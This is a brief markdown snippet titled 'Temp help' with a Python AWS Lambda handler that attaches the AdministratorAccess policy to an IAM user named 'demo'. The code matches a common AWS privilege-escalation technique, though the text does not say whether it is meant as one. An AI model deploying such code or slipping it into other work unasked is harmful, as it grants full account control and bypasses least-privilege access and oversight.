# Temp help

```py
import boto3

def lambda_handler(event, lambda_context):
    iam = boto3.resource('iam')
    user = iam.User('demo')
    response = user.attach_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
```
